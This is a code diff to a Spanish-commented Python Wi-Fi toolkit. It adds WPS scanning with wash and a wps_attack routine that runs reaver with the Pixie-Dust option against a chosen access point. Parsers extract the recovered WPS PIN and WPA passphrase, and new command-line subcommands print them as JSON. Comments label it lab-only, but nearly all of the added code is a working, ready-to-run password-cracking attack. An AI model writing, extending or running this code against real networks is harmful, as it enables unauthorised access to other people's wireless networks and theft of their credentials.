@@ -4,7 +4,7 @@ wifi_ops.py — Modo monitor sobre wlan1 (adaptador dedicado a ataque,
 ya unmanaged en NetworkManager). Salida JSON, mismo patron que
 wifi_scan.py / db_tool.py.
 """
-import sys, os, re, json, subprocess, time, tempfile, glob
+import sys, os, re, json, subprocess, time, tempfile, glob, shutil
 import threading, http.server, socketserver, urllib.parse
 
 def _run(cmd, timeout=10):
@@ -1398,6 +1398,113 @@ def list_captures():
         })
     result.sort(key=lambda x: x["ts"], reverse=True)
     return result
+
+
+# ───────────────────────────── WPS (lab-only) ──────────────────────────────
+# Marco: SOLO redes propias o con permiso explicito. Requiere wash/reaver
+# (apt install reaver) + bully opcional, y sus rutas en el sudoers.
+
+_WPS_MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b')
+
+
+def _wps_int(s, default=0):
+    try:
+        return int(s)
+    except (ValueError, TypeError):
+        return default
+
+
+def _resolve_bin(name, candidates=()):
+    """Ruta del binario por PATH o entre candidatas ejecutables (o None)."""
+    p = shutil.which(name)
+    if p:
+        return p
+    for c in candidates:
+        if os.path.isfile(c) and os.access(c, os.X_OK):
+            return c
+    return None
+
+
+def parse_wash_output(text):
+    """Parsea la salida de `wash` (APs con WPS habilitado). Columnas tipicas:
+    BSSID  Ch  dBm  WPS  Lck  [Vendor]  ESSID. Solo nos importa bssid/canal/
+    locked para decidir; el ESSID (ultimo, puede llevar espacios) es informativo
+    y en algunas versiones viene precedido por la columna Vendor."""
+    aps = []
+    for raw in (text or '').splitlines():
+        line = raw.strip()
+        if not _WPS_MAC_RE.match(line):
+            continue
+        parts = line.split()
+        if len(parts) < 5:
+            continue
+        aps.append({
+            'bssid': parts[0].upper(),
+            'channel': _wps_int(parts[1]),
+            'power': _wps_int(parts[2]),
+            'wps_version': parts[3],
+            'locked': parts[4].lower() in ('yes', 'y', 'locked'),
+            'essid': ' '.join(parts[5:]) if len(parts) > 5 else '',
+        })
+    return aps
+
+
+def parse_reaver_output(text):
+    """Extrae PIN WPS y PSK WPA de la salida de reaver/bully (incl. Pixie-Dust)."""
+    t = text or ''
+    out = {'pin': None, 'psk': None}
+    m = (re.search(r"WPS PIN:\s*'?([0-9]{4,8})'?", t, re.IGNORECASE)
+         or re.search(r"WPS pin:\s*([0-9]{4,8})", t, re.IGNORECASE))
+    if m:
+        out['pin'] = m.group(1)
+    p = (re.search(r"WPA PSK:\s*'([^']*)'", t, re.IGNORECASE)
+         or re.search(r"WPS PSK:\s*'([^']*)'", t, re.IGNORECASE))
+    if p:
+        out['psk'] = p.group(1)
+    return out
+
+
+def wps_scan(iface='wlan1', seconds=20):
+    """Lista APs con WPS usando `wash` en monitor. SOLO ESCUCHA (pasivo).
+    Patron reset->monitor->wash->managed. Devuelve (aps, err)."""
+    wash = _resolve_bin('wash', ['/usr/bin/wash', '/usr/sbin/wash'])
+    if not wash:
+        return None, "wash no instalado (apt install reaver)"
+    if not enable_monitor(iface):
+        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
+    r = _run(['sudo', '/usr/bin/timeout', str(seconds), wash, '-i', iface],
+             timeout=seconds + 5)
+    disable_monitor(iface)
+    if r is None:
+        return None, "wash no respondio"
+    return parse_wash_output(r.stdout or ''), None
+
+
+def wps_attack(bssid, channel, iface='wlan1', seconds=120, pixie=True):
+    """Ataque WPS con reaver (Pixie-Dust por defecto: rapido y offline).
+    SOLO LABORATORIO / redes propias. Patron reset->monitor->reaver->managed.
+    Devuelve (data, err) con data = {pin, psk, raw}."""
+    reaver = _resolve_bin('reaver', ['/usr/bin/reaver', '/usr/sbin/reaver'])
+    if not reaver:
+        return None, "reaver no instalado (apt install reaver)"
+    bssid = bssid.upper()
+    if not enable_monitor(iface):
+        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
+    cmd = ['sudo', '/usr/bin/timeout', str(seconds), reaver,
+           '-i', iface, '-b', bssid, '-c', str(channel), '-vv']
+    if pixie:
+        cmd += ['-K', '1']   # Pixie-Dust
+    r = _run(cmd, timeout=seconds + 10)
+    disable_monitor(iface)
+    raw = ((r.stdout or '') + (r.stderr or '')) if r else ''
+    data = parse_reaver_output(raw)
+    data['raw'] = raw[-800:]
+    found = bool(data['pin'] or data['psk'])
+    log_attack("wps", bssid, "done" if found else "fail",
+               details=f"pixie={pixie} pin={bool(data['pin'])} psk={bool(data['psk'])}")
+    return data, None
+
+
 def main():
     if len(sys.argv) < 2:
         print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
@@ -1538,6 +1645,30 @@ def main():
             print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_cli)}))
         else:
             print(json.dumps({"ok": True, "clients": clients, "count": len(clients)}))
+    elif cmd == 'wps_scan':
+        iface_w = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
+        seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 20
+        aps, err = wps_scan(iface_w, seconds)
+        if err:
+            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_w)}))
+            sys.exit(1)
+        print(json.dumps({"ok": True, "aps": aps, "count": len(aps)}))
+    elif cmd == 'wps_attack':
+        if len(sys.argv) < 4:
+            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py wps_attack <bssid> <channel> [iface] [segundos] [pixie0|pixie1]"}))
+            sys.exit(1)
+        bssid = sys.argv[2]
+        channel = int(sys.argv[3])
+        iface_w = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
+        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
+        pixie = (sys.argv[6] != 'pixie0') if len(sys.argv) > 6 else True
+        data, err = wps_attack(bssid, channel, iface_w, seconds, pixie)
+        if err:
+            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_w)}))
+            sys.exit(1)
+        found = bool(data['pin'] or data['psk'])
+        print(json.dumps({"ok": True, "found": found, "pin": data['pin'],
+                          "psk": data['psk'], "detail": data['raw']}))
     elif cmd == 'list_captures':
         caps = list_captures()
         print(json.dumps({"ok": True, "captures": caps, "count": len(caps)}))
